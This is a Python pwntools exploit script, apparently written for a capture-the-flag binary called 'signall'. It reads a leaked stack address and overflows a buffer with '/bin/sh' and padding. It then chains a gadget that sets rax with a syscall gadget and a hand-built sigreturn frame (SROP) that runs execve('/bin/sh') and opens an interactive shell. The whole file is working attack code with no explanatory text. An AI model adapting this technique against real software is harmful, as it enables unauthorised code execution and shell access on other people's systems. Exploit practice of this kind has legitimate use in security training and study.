#!/usr/bin/python3
from pwn import *

exe = "./signall"

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    b* main
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
offset  = b"/bin/sh\x00" + 112*b"a"
setrax  = p64(0x40116c)
syscall = p64(0x40115e)

p = start()
p.recvuntil(b"@")
stbin = p.recvuntil(",")[:-1:]
# leak verified
stbin = int(stbin, 16)
print(hex(stbin))
p.recvline()
# building fake frame
# automated
context.arch = "amd64"
framez = SigreturnFrame()
framez.rdi = stbin
framez.rsi = 0x00
framez.rax = 0x3b
framez.rdx = 0x00
framez.rip = 0x40115e
# ---manual---
# The ss register must be set according to architecture | the other thing is that the CS register must be set according to the architecture
frame   = 104*b"\x00"+ p64(stbin) + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x3b) + p64(0x00) + p64(0x00)+ syscall + p64(0x00) + p64(0x2b00000033) + 8*p64(0x00)
p.sendline(offset + setrax + syscall + frame)
# gdb.attach(p)
p.interactive()
# print(framez)